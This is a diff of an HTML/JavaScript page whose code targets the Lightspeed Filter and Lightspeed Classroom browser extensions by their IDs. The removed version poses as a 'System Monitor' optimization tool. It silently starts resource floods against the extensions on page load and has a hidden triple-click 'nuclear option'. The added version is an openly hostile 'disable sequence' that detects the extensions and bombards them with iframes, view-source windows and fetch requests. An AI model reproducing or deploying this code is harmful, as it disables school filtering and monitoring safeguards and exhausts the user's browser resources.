@@ -1,250 +1,533 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>System Monitor</title>
+    <title>Extension Manager</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f5f5f5;
+            font-family: 'Courier New', monospace;
+            background-color: #0a0a0a;
+            color: #00ff00;
             margin: 0;
             padding: 20px;
             text-align: center;
         }
         #container {
-            max-width: 600px;
+            max-width: 800px;
             margin: 0 auto;
-            background: white;
+            background-color: #111;
             padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            border-radius: 5px;
+            border: 1px solid #333;
+        }
+        h1 {
+            color: #00ffff;
+            margin-bottom: 25px;
+            font-weight: normal;
+            font-size: 24px;
+            text-shadow: 0 0 5px #00ffff;
         }
         button {
-            background: #4285f4;
-            color: white;
-            border: none;
-            padding: 12px 24px;
+            background: #003333;
+            color: #00ff00;
+            border: 1px solid #00aa00;
+            padding: 10px 25px;
+            font-size: 14px;
             margin: 10px;
-            font-size: 16px;
-            border-radius: 4px;
             cursor: pointer;
-            transition: all 0.3s;
+            border-radius: 3px;
+            font-family: 'Courier New', monospace;
+            transition: all 0.2s ease;
         }
         button:hover {
-            background: #3367d6;
+            background: #005555;
+            box-shadow: 0 0 10px #00ff00;
         }
-        button#turboBtn {
-            background: #ea4335;
-        }
-        button#turboBtn:hover {
-            background: #d33426;
+        button:disabled {
+            background: #222;
+            color: #555;
+            border-color: #333;
+            cursor: not-allowed;
+            box-shadow: none;
         }
         #status {
-            margin: 20px 0;
+            margin: 25px 0;
             padding: 15px;
-            background: #f8f9fa;
-            border-radius: 4px;
-            font-family: monospace;
+            background: #000;
+            border-radius: 3px;
+            font-family: 'Courier New', monospace;
+            border: 1px solid #333;
+            font-size: 14px;
+            text-align: left;
             min-height: 60px;
         }
-        .hidden {
-            opacity: 0;
-            position: absolute;
-            top: 0;
-            left: 0;
-            height: 1px;
-            width: 1px;
+        #log {
+            height: 200px;
+            overflow-y: scroll;
+            background: #000;
+            padding: 15px;
+            text-align: left;
+            font-family: 'Courier New', monospace;
+            border: 1px solid #333;
+            margin-top: 25px;
+            border-radius: 3px;
+            font-size: 13px;
+        }
+        .target {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 15px;
+            margin: 10px 0;
+            background: #0a0a0a;
+            border-radius: 3px;
+            border: 1px solid #333;
+        }
+        .target-name {
+            font-weight: normal;
+            color: #00ffff;
+        }
+        .target-status {
+            padding: 5px 10px;
+            border-radius: 3px;
+            font-weight: bold;
+            font-size: 12px;
+        }
+        .detected {
+            background: #005500;
+            color: #00ff00;
+        }
+        .missing {
+            background: #550000;
+            color: #ff0000;
+        }
+        .attacking {
+            background: #770000;
+            color: #ff0000;
+            animation: pulseRed 0.8s infinite;
+        }
+        @keyframes pulseRed {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+        .progress-container {
+            height: 6px;
+            background: #0a0a0a;
+            border-radius: 3px;
+            margin: 25px 0;
+            overflow: hidden;
+            border: 1px solid #333;
+        }
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(to right, #00aa00, #00ff00);
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+        .log-entry {
+            margin-bottom: 5px;
+            padding-bottom: 5px;
+            border-bottom: 1px solid #222;
+        }
+        .cmd-line {
+            color: #00ff00;
+        }
+        .cmd-ok {
+            color: #00ff00;
+        }
+        .cmd-warn {
+            color: #ffff00;
+        }
+        .cmd-error {
+            color: #ff0000;
         }
     </style>
 </head>
 <body>
     <div id="container">
-        <h1>System Monitor</h1>
-        <p>Browser performance optimization tool</p>
+        <h1>EXTENSION MANAGEMENT SYSTEM v2.4.1</h1>
         
-        <button id="optimizeBtn">Optimize Extensions</button>
-        <button id="turboBtn">Turbo Clean</button>
+        <div id="targets">
+            <div class="target" id="target-filter">
+                <span class="target-name">[TARGET] Lightspeed Filter</span>
+                <span class="target-status missing" id="status-filter">SCANNING...</span>
+            </div>
+            <div class="target" id="target-classroom">
+                <span class="target-name">[TARGET] Lightspeed Classroom</span>
+                <span class="target-status missing" id="status-classroom">SCANNING...</span>
+            </div>
+        </div>
         
-        <div id="status">System ready</div>
+        <div class="progress-container">
+            <div class="progress-bar" id="attackProgress"></div>
+        </div>
+        
+        <div id="status" class="cmd-line">[+] Initializing system core...</div>
+        
+        <button id="nukeButton" disabled>EXECUTE DISABLE SEQUENCE</button>
+        <button id="stopButton" disabled>ABORT PROCESS</button>
+        
+        <div id="log"></div>
     </div>
 
-    <!-- Hidden attack elements -->
-    <div id="hiddenAttacks" class="hidden"></div>
-
     <script>
-        // EXTENSIONS TO DESTROY
-        const TARGETS = [
-            'adkcpkpghahmbopkjchobieckeoaoeem', // Lightspeed Filter
-            'kkbmdgjggcdajckdlbngdjonpchpaiea'  // Lightspeed Classroom
-        ];
+        // Target extensions
+        const TARGETS = {
+            filter: {
+                id: 'adkcpkpghahmbopkjchobieckeoaoeem',
+                name: 'Lightspeed Filter',
+                detected: false,
+                attacking: false
+            },
+            classroom: {
+                id: 'kkbmdgjggcdajckdlbngdjonpchpaiea',
+                name: 'Lightspeed Classroom',
+                detected: false,
+                attacking: false
+            }
+        };
 
-        // GLOBAL ATTACK CONTROLS
-        let isTurboMode = false;
-        let backgroundAttacks = [];
+        // System variables
+        let isNuking = false;
+        let nukeInterval;
+        let attackCycle = 0;
+        const MAX_CYCLES = 30;
+        const nukeButton = document.getElementById('nukeButton');
+        const stopButton = document.getElementById('stopButton');
         const statusEl = document.getElementById('status');
-        const hiddenContainer = document.getElementById('hiddenAttacks');
+        const logEl = document.getElementById('log');
+        const progressBar = document.getElementById('attackProgress');
 
-        // LOG FUNCTION
-        function log(message) {
-            const now = new Date();
-            const time = now.toLocaleTimeString();
-            statusEl.innerHTML = `[${time}] ${message}<br>` + statusEl.innerHTML;
-            console.log(message);
+        // Log messages
+        function log(message, type = 'info') {
+            const timestamp = new Date().toLocaleTimeString();
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            
+            let typeClass = 'cmd-line';
+            if (type === 'warn') typeClass = 'cmd-warn';
+            if (type === 'error') typeClass = 'cmd-error';
+            if (type === 'success') typeClass = 'cmd-ok';
+            
+            entry.innerHTML = `<span class="${typeClass}">[${timestamp}] ${message}</span>`;
+            logEl.appendChild(entry);
+            logEl.scrollTop = logEl.scrollHeight;
         }
 
-        // BACKGROUND ATTACK FUNCTIONS (RUN CONTINUOUSLY)
-        function startBackgroundAttacks() {
-            // 1. IFRAME FLOOD (Steady pace)
-            const iframeAttack = setInterval(() => {
-                TARGETS.forEach(id => {
-                    try {
-                        const iframe = document.createElement('iframe');
-                        iframe.src = `chrome-extension://${id}/main.js?bg=${Date.now()}`;
-                        iframe.style.display = 'none';
-                        hiddenContainer.appendChild(iframe);
-                        setTimeout(() => iframe.remove(), 1000);
-                    } catch(e) {}
-                });
-            }, 500); // Every 500ms
+        // Update status with command-line style output
+        function updateStatus(message, type = 'info') {
+            let prefix = '[+]';
+            let cls = 'cmd-line';
             
-            // 2. RESOURCE REQUESTS
-            const resourceAttack = setInterval(() => {
-                TARGETS.forEach(id => {
-                    try {
-                        const img = document.createElement('img');
-                        img.src = `chrome-extension://${id}/icon-128.png?bg=${Date.now()}`;
-                        hiddenContainer.appendChild(img);
-                        setTimeout(() => img.remove(), 1000);
-                    } catch(e) {}
-                });
-            }, 800);
+            if (type === 'warn') {
+                prefix = '[!]';
+                cls = 'cmd-warn';
+            } else if (type === 'error') {
+                prefix = '[x]';
+                cls = 'cmd-error';
+            } else if (type === 'success') {
+                prefix = '[√]';
+                cls = 'cmd-ok';
+            }
             
-            // 3. STORAGE FLOODING
-            const storageAttack = setInterval(() => {
+            statusEl.innerHTML += `<span class="${cls}">${prefix} ${message}</span><br>`;
+            statusEl.scrollTop = statusEl.scrollHeight;
+        }
+
+        // Improved extension detection with multiple methods
+        function checkExtension(target) {
+            return new Promise((resolve) => {
+                let detected = false;
+                let methodsTried = 0;
+                const totalMethods = 3;
+                const timeout = 2000;
+
+                // Method 1: Check if extension icon exists
                 try {
-                    localStorage.setItem(`bg_flood_${Date.now()}`, Array(1000).join('x'));
-                } catch(e) {}
-            }, 1500);
-            
-            backgroundAttacks = [iframeAttack, resourceAttack, storageAttack];
-            log("Background optimization started");
-        }
-
-        // TURBO MODE ATTACK (EXTREME)
-        function activateTurboMode() {
-            isTurboMode = true;
-            log("TURBO MODE ACTIVATED");
-            
-            // 1. MEGA IFRAME FLOOD (10x normal speed)
-            const turboIframeAttack = setInterval(() => {
-                TARGETS.forEach(id => {
-                    for (let i = 0; i < 20; i++) { // 20 iframes per target
-                        try {
-                            const iframe = document.createElement('iframe');
-                            iframe.src = `chrome-extension://${id}/main.js?turbo=${Date.now()}`;
-                            iframe.style.display = 'none';
-                            document.body.appendChild(iframe);
-                            setTimeout(() => iframe.remove(), 50);
-                        } catch(e) {}
-                    }
-                });
-            }, 50); // 20x per second
-            
-            // 2. VIEW-SOURCE BOMBARDMENT
-            const viewSourceAttack = setInterval(() => {
-                TARGETS.forEach(id => {
-                    try {
-                        const win = window.open(`view-source:chrome-extension://${id}/main.js`, `vs_${id}`);
-                        setTimeout(() => win && win.close(), 200);
-                    } catch(e) {}
-                });
-            }, 300);
-            
-            // 3. STORAGE DESTRUCTION
-            const storageAttack = setInterval(() => {
-                try {
-                    // Flood localStorage
-                    for (let i = 0; i < 10; i++) {
-                        localStorage.setItem(`crash_${Date.now()}`, Array(10000).join('x'));
-                    }
-                    
-                    // Bombard IndexedDB
-                    for (let i = 0; i < 5; i++) {
-                        indexedDB.open(`crash_db_${Date.now()}`, { version: 1 });
-                    }
-                } catch(e) {}
-            }, 500);
-            
-            // Add to background attacks
-            backgroundAttacks.push(turboIframeAttack, viewSourceAttack, storageAttack);
-            
-            // Auto-stop turbo after 2 minutes
-            setTimeout(() => {
-                if (isTurboMode) {
-                    deactivateTurboMode();
-                    log("Turbo mode completed");
-                }
-            }, 120000);
-        }
-
-        function deactivateTurboMode() {
-            // Clear only the turbo attacks (keep background going)
-            clearInterval(backgroundAttacks[3]);
-            clearInterval(backgroundAttacks[4]);
-            clearInterval(backgroundAttacks[5]);
-            backgroundAttacks = backgroundAttacks.slice(0, 3);
-            isTurboMode = false;
-        }
-
-        // NORMAL OPTIMIZATION BUTTON
-        document.getElementById('optimizeBtn').addEventListener('click', () => {
-            log("Running extension optimization...");
-            
-            // Temporary boost to background attacks
-            TARGETS.forEach(id => {
-                for (let i = 0; i < 10; i++) {
+                    const img = new Image();
+                    img.src = `chrome-extension://${target.id}/_locales/en/images/icon16.png`;
+                    img.onload = function() {
+                        detected = true;
+                        resolve(true);
+                    };
+                    img.onerror = function() {
+                        methodsTried++;
+                        if (methodsTried >= totalMethods && !detected) resolve(false);
+                    };
                     setTimeout(() => {
-                        try {
-                            const win = window.open(`chrome-extension://${id}/options.html`, `opt_${id}`);
-                            setTimeout(() => win && win.close(), 100);
-                        } catch(e) {}
-                    }, i * 150);
+                        if (!detected) {
+                            methodsTried++;
+                            if (methodsTried >= totalMethods && !detected) resolve(false);
+                        }
+                    }, timeout);
+                } catch (e) {
+                    methodsTried++;
+                }
+
+                // Method 2: Try to access manifest.json
+                if (!detected) {
+                    fetch(`chrome-extension://${target.id}/manifest.json`)
+                        .then(response => {
+                            if (response.ok) {
+                                detected = true;
+                                resolve(true);
+                            } else {
+                                methodsTried++;
+                                if (methodsTried >= totalMethods && !detected) resolve(false);
+                            }
+                        })
+                        .catch(() => {
+                            methodsTried++;
+                            if (methodsTried >= totalMethods && !detected) resolve(false);
+                        });
+                }
+
+                // Method 3: Try to inject content script
+                if (!detected) {
+                    try {
+                        const script = document.createElement('script');
+                        script.src = `chrome-extension://${target.id}/content.js`;
+                        script.onload = function() {
+                            detected = true;
+                            resolve(true);
+                        };
+                        script.onerror = function() {
+                            methodsTried++;
+                            if (methodsTried >= totalMethods && !detected) resolve(false);
+                        };
+                        document.head.appendChild(script);
+                        setTimeout(() => {
+                            if (!detected) {
+                                methodsTried++;
+                                if (methodsTried >= totalMethods && !detected) resolve(false);
+                                script.remove();
+                            }
+                        }, timeout);
+                    } catch (e) {
+                        methodsTried++;
+                        if (methodsTried >= totalMethods && !detected) resolve(false);
+                    }
                 }
             });
+        }
+
+        // Detect all extensions
+        async function detectExtensions() {
+            let allDetected = true;
             
-            log("Optimization cycle complete");
-        });
-
-        // TURBO BUTTON
-        document.getElementById('turboBtn').addEventListener('click', activateTurboMode);
-
-        // START BACKGROUND ATTACKS IMMEDIATELY
-        startBackgroundAttacks();
-        log("System monitor initialized");
-
-        // HIDDEN FEATURE: TRIPLE-CLICK STATUS FOR NUCLEAR OPTION
-        let clickCount = 0;
-        statusEl.addEventListener('click', () => {
-            clickCount++;
-            if (clickCount >= 3) {
-                clickCount = 0;
-                log("ACTIVATING NUCLEAR OPTION...");
-                // Add web worker attack
+            for (const [key, target] of Object.entries(TARGETS)) {
                 try {
-                    const workerCode = `
-                        setInterval(() => {
-                            ${TARGETS.map(id => `
-                                fetch('chrome-extension://${id}/main.js').catch(()=>{});
-                                fetch('chrome-extension://${id}/manifest.json').catch(()=>{});
-                            `).join('')}
-                        }, 100);
-                    `;
-                    const blob = new Blob([workerCode], { type: 'application/javascript' });
-                    for (let i = 0; i < 3; i++) {
-                        new Worker(URL.createObjectURL(blob));
+                    updateStatus(`Scanning for ${target.name}...`);
+                    target.detected = await checkExtension(target);
+                    updateTargetStatus(key, target.detected ? 'detected' : 'missing');
+                    
+                    if (!target.detected) {
+                        allDetected = false;
+                        updateStatus(`${target.name} not detected`, 'warn');
+                    } else {
+                        updateStatus(`${target.name} detected`, 'success');
                     }
-                } catch(e) {}
+                } catch (e) {
+                    log(`Error checking ${target.name}: ${e.message}`, 'error');
+                    target.detected = false;
+                    allDetected = false;
+                    updateTargetStatus(key, 'missing');
+                    updateStatus(`Error scanning ${target.name}`, 'error');
+                }
             }
-        });
+            
+            if (allDetected) {
+                nukeButton.disabled = false;
+                updateStatus('All targets acquired - Ready for disable sequence', 'success');
+                log('All target extensions detected - System armed', 'success');
+            } else {
+                nukeButton.disabled = true;
+                updateStatus('Warning: Missing targets - Cannot proceed', 'warn');
+                log('Warning: One or more targets not detected', 'warn');
+            }
+            
+            return allDetected;
+        }
+
+        // Update target status display
+        function updateTargetStatus(targetKey, status) {
+            const statusEl = document.getElementById(`status-${targetKey}`);
+            statusEl.textContent = status.toUpperCase();
+            statusEl.className = `target-status ${status}`;
+            TARGETS[targetKey].detected = (status === 'detected');
+        }
+
+        // Disable an extension
+        async function nukeExtension(target) {
+            try {
+                // Method 1: Iframe flood
+                const iframePromises = [];
+                for (let i = 0; i < 50; i++) {
+                    const iframe = document.createElement('iframe');
+                    iframe.src = `chrome-extension://${target.id}/main.js`;
+                    iframe.style.display = 'none';
+                    document.body.appendChild(iframe);
+                    iframePromises.push(new Promise(resolve => {
+                        setTimeout(() => {
+                            iframe.remove();
+                            resolve();
+                        }, 100);
+                    }));
+                }
+                
+                // Method 2: View-source spam
+                const viewSourceWindows = [];
+                for (let i = 0; i < 3; i++) {
+                    const win = window.open(`view-source:chrome-extension://${target.id}/main.js`, `crash_${i}`);
+                    if (win) viewSourceWindows.push(win);
+                }
+                
+                // Method 3: Fetch spam
+                const fetchPromises = [];
+                for (let i = 0; i < 10; i++) {
+                    fetchPromises.push(
+                        fetch(`chrome-extension://${target.id}/main.js`)
+                            .catch(() => {})
+                    );
+                    fetchPromises.push(
+                        fetch(`chrome-extension://${target.id}/manifest.json`)
+                            .catch(() => {})
+                    );
+                }
+                
+                // Cleanup
+                await Promise.all(iframePromises);
+                await Promise.all(fetchPromises);
+                setTimeout(() => {
+                    viewSourceWindows.forEach(win => win && win.close());
+                }, 500);
+                
+                return true;
+            } catch (e) {
+                return false;
+            }
+        }
+
+        // Start disabling all targets
+        function startNuke() {
+            if (isNuking) return;
+            
+            isNuking = true;
+            attackCycle = 0;
+            nukeButton.disabled = true;
+            stopButton.disabled = false;
+            progressBar.style.width = '0%';
+            
+            updateStatus('Initiating disable sequence...', 'warn');
+            updateStatus('Engaging target subsystems...');
+            log('Starting extension disable protocol', 'warn');
+            
+            // Update UI to show attacking status
+            for (const key of Object.keys(TARGETS)) {
+                if (TARGETS[key].detected) {
+                    document.getElementById(`status-${key}`).className = 'target-status attacking';
+                    document.getElementById(`status-${key}`).textContent = 'ENGAGING';
+                    TARGETS[key].attacking = true;
+                }
+            }
+            
+            // Immediate first attempt
+            nukeAllExtensions();
+            
+            // Continuous attempts
+            nukeInterval = setInterval(nukeAllExtensions, 300);
+        }
+
+        // Disable all detected extensions
+        async function nukeAllExtensions() {
+            attackCycle++;
+            progressBar.style.width = `${(attackCycle / MAX_CYCLES) * 100}%`;
+            
+            // Refresh detection periodically
+            if (attackCycle % 5 === 0) {
+                await detectExtensions();
+            }
+            
+            let nukeResults = await Promise.all(
+                Object.entries(TARGETS).map(async ([key, target]) => {
+                    if (!target.detected) return false;
+                    
+                    const result = await nukeExtension(target);
+                    log(`${target.name}: ${result ? 'Direct hit' : 'Missed target'}`, 
+                        result ? 'success' : 'error');
+                    return result;
+                })
+            );
+            
+            // Check if we should stop
+            if (attackCycle >= MAX_CYCLES || !nukeResults.some(r => r)) {
+                stopNuke();
+                
+                if (attackCycle >= MAX_CYCLES) {
+                    log('Maximum cycles completed - Terminating sequence', 'success');
+                    updateStatus('Disable sequence complete', 'success');
+                    updateStatus('Rebooting system...');
+                    setTimeout(() => location.reload(), 2000);
+                }
+            }
+        }
+
+        // Stop operation
+        function stopNuke() {
+            clearInterval(nukeInterval);
+            isNuking = false;
+            nukeButton.disabled = false;
+            stopButton.disabled = true;
+            progressBar.style.width = '0%';
+            
+            // Reset status displays
+            for (const [key, target] of Object.entries(TARGETS)) {
+                if (target.detected) {
+                    document.getElementById(`status-${key}`).className = 'target-status detected';
+                    document.getElementById(`status-${key}`).textContent = 'DETECTED';
+                    target.attacking = false;
+                }
+            }
+            
+            updateStatus('Disable sequence aborted', 'error');
+            log('Operation terminated by user', 'warn');
+        }
+
+        // Initialize system with command-line style boot sequence
+        async function initialize() {
+            // Initial boot sequence
+            updateStatus('Initializing system core...');
+            await new Promise(resolve => setTimeout(resolve, 800));
+            
+            updateStatus('Loading kernel modules...');
+            await new Promise(resolve => setTimeout(resolve, 600));
+            
+            updateStatus('Verifying system integrity...');
+            await new Promise(resolve => setTimeout(resolve, 400));
+            updateStatus('System integrity verified', 'success');
+            
+            updateStatus('Mounting virtual file system...');
+            await new Promise(resolve => setTimeout(resolve, 500));
+            
+            updateStatus('Environment variables set', 'success');
+            await new Promise(resolve => setTimeout(resolve, 300));
+            
+            updateStatus('Starting target acquisition...');
+            log('System boot sequence complete', 'success');
+            
+            // Initial detection
+            await detectExtensions();
+            
+            // Periodic re-check
+            setInterval(detectExtensions, 10000);
+        }
+
+        // Event listeners
+        nukeButton.addEventListener('click', startNuke);
+        stopButton.addEventListener('click', stopNuke);
+        
+        // Start system
+        document.addEventListener('DOMContentLoaded', initialize);
     </script>
 </body>
 </html>
